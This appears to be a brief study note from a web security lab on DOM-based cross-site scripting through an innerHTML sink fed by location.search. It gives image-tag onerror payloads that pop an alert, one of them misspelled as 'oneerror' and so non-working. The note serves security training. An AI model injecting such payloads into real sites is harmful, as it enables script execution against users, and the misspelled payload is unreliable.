**DOM XSS in innerHTML sink using source location.search**
Sink refer method of function that causes malicious js to be performed on the page
Script tag wont work with innerHTML 

```
<img/src/onerror=alert(1)>
```

From <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet> 

You can also use the payload <img src='0' oneerror='alert()'>

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/baa1e158-bad4-417c-9449-09342b18b2e8)


